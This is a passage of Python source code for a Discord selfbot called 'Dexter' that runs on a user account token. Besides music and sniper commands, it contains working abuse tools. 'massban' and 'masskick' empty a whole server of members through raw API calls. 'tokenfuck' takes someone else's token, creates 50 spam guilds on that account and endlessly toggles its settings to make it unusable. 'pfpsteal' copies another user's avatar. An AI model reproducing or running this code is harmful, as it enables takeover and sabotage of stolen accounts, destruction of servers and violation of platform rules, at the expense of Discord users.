    voice = get(Dexter.voice_clients, guild=ctx.guild)
    if voice and voice.is_connected():
        voice.play('song.mp3')
    else:
        await ctx.send('You need to be a in VC to play music')


@Dexter.command(pass_context=True)
async def snipers(ctx):
    embed = discord.Embed(color=0x303037)
    embed.set_author(name="Dexter SELFBOTe")

    embed.set_footer(text="Created by Dexter")
    embed.add_field(name=">giveaway", value="```autoreact on the giveaway```")
    embed.add_field(name=">snipe",
                    value="```Shows recently deleted message```")
    embed.add_field(name=">slotbot", value="```auto collect slotbot drops ```")
    embed.add_field(
        name=">nitrosniper",
        value="```auto collect drop nitro gifts\n Ex - >nitrosniper on\off ```"
    )
    await ctx.send(embed=embed)


@Dexter.command(aliases=[])
async def msgsniper(ctx, msgsniperlol=None):
    await ctx.message.delete()
    if str(msgsniperlol).lower() == 'true' or str(
            msgsniperlol).lower() == 'on':
        Dexter.msgsniper = True
        await ctx.send('Dexter Message-Sniper is now **enabled**')
    elif str(msgsniperlol).lower() == 'false' or str(
            msgsniperlol).lower() == 'off':
        Dexter.msgsniper = False
        await ctx.send('Dexter Message-Sniper is now **disabled**')


@Dexter.command()
async def massban(ctx, guild):
    guild = guild
    await Dexter.wait_until_ready()
    guildOBJ = Dexter.get_guild(int(guild))
    members = await guildOBJ.chunk()
    try:
        os.remove('DexterPlayZ/members.txt')
    except:
        pass

    membercount = 0
    with open('DexterPlayZ/members.txt', 'a') as (m):
        for member in members:
            m.write(str(member.id) + '\n')
            membercount += 1

        await ctx.send(
            'Dexter SELFBOT | MASS BAN INITIATED\nRemoving Members in progress......'
        )
        m.close()
    guild = guild
    print()
    members = open('DexterPlayZ/members.txt')
    for member in members:
        while True:
            r = requests.put(
                f"https://discord.com/api/v8/guilds/{guild}/bans/{member}",
                headers=headers)
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"Banned{member.strip()}")
                    break
                else:
                    break

    members.close()


@Dexter.command(aliases=['slotsniper', "slotbotsniper"])
async def slotbot(ctx, param=None):
    await ctx.message.delete()
    Dexter.slotbot_sniper = False
    if str(param).lower() == 'true' or str(param).lower() == 'on':
        Dexter.slotbot_sniper = True
    elif str(param).lower() == 'false' or str(param).lower() == 'off':
        Dexter.slotbot_sniper = False


@Dexter.command(
    aliases=['giveawaysniper', 'snipegiveaway', "snipegw", "gwsniper"])
async def giveawaysnipe(ctx, snipestatus=None):
    global giveawaysniping
    if snipestatus == None:
        if giveawaysniping == "off":
            giveawaysniping = "on"
        elif giveawaysniping == "on":
            giveawaysniping = "off"
    else:
        if snipestatus.lower() == "off":
            giveawaysniping = "off"
        if snipestatus.lower() == "on":
            giveawaysniping = "on"

        if snipestatus.lower() == "true":
            giveawaysniping = "on"
        if snipestatus.lower() == "false":
            giveawaysniping = "off"

    randcolor = 0x303037
    embed = discord.Embed(
        title="Dexter SelfBot - Giveaway Sniper",
        description=f"Giveaway sniper is now : `{giveawaysniping}`",
        color=randcolor)
    embed.set_thumbnail(
        url=
        "https://cdn.discordapp.com/icons/838111658713940008/a_daa32e7cc66a9bb90ed8a253090b26e2.gif?size=2048"
    )
    embed.set_footer(text="Dexter Selfbot ")
    await ctx.message.edit(content="", embed=embed)


@Dexter.command(aliases=['tokenfucker', 'disable', 'crash'])
async def tokenfuck(ctx, _token):
    await ctx.message.delete()
    headers = {
        'User-Agent':
        'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7',
        'Content-Type': 'application/json',
        'Authorization': _token,
    }
    request = requests.Session()
    payload = {
        'theme': "light",
        'locale': "ja",
        'message_display_compact': False,
        'inline_embed_media': False,
        'inline_attachment_media': False,
        'gif_auto_play': False,
        'render_embeds': False,
        'render_reactions': False,
        'animate_emoji': False,
        'convert_emoticons': False,
        'enable_tts_command': False,
        'explicit_content_filter': '0',
        'status': "invisible"
    }
    guild = {
        'channels': None,
        'icon': None,
        'name': "Dexter was here",
        'region': "europe"
    }
    for _i in range(50):
        requests.post('https://discordapp.com/api/v6/guilds',
                      headers=headers,
                      json=guild)
    while True:
        try:
            request.patch(
                "https://canary.discordapp.com/api/v6/users/@me/settings",
                headers=headers,
                json=payload)
        except Exception as e:
            print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)
        else:
            break
    modes = cycle(["light", "dark"])
    statuses = cycle(["online", "idle", "dnd", "invisible"])
    while True:
        setting = {
            'theme': next(modes),
            'locale': random.choice(locales),
            'status': next(statuses)
        }
        while True:
            try:
                request.patch(
                    "https://canary.discordapp.com/api/v6/users/@me/settings",
                    headers=headers,
                    json=setting,
                    timeout=10)
            except Exception as e:
                print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)
            else:
                break


@Dexter.command()
async def masskick(ctx, guild):
    guild = guild
    await Dexter.wait_until_ready()
    guildOBJ = Dexter.get_guild(int(guild))
    members = await guildOBJ.chunk()
    try:
        os.remove('members.txt')
    except:
        pass

    membercount = 0
    with open('members.txt', 'a') as (m):
        for member in members:
            m.write(str(member.id) + '\n')
            membercount += 1

        await ctx.send(
            'Dexter SELFBOT | MASS KICK INITIATED\nRemoving Members in progress......'
        )
        m.close()
    guild = guild
    print()
    members = open('members.txt')
    for member in members:
        while True:
            r = requests.delete(
                f"https://discord.com/api/v8/guilds/{guild}/members/{member}",
                headers=headers)
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"Kicked {member.strip()}")
                    break
                else:
                    break

    members.close()


@Dexter.command(aliases=['pfpget', 'stealpfp'])
async def pfpsteal(ctx, user: discord.Member):
    await ctx.message.delete()
    if Dexter.get('Dexterencrypt2') == 'Dexterencrypt2':
        print(
            f"{Fore.RED}[ERROR] {Fore.YELLOW}You didnt put your password in the config.json file"
            + Fore.RESET)
    else:
        password = Dexter.get('Dexterencrypt2')
        with open('Images/Avatars/Stolen/Stolen.png', 'wb') as f:
            r = requests.get(user.avatar_url, stream=True)
            for block in r.iter_content(1024):
                if not block:
                    break
                f.write(block)
        try:
            Image.open('Images/Avatars/Stolen/Stolen.png').convert('RGB')
            with open('Images/Avatars/Stolen/Stolen.png', 'rb') as f:
                await Dexter.user.edit(password=password, avatar=f.read())
        except discord.HTTPException as e:
            print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)


if token_type == "user":
    Dexter.run(Dexterencrypt, bot=False)
elif token_type == "bot":
    Dexter.run(Dexterencrypt)
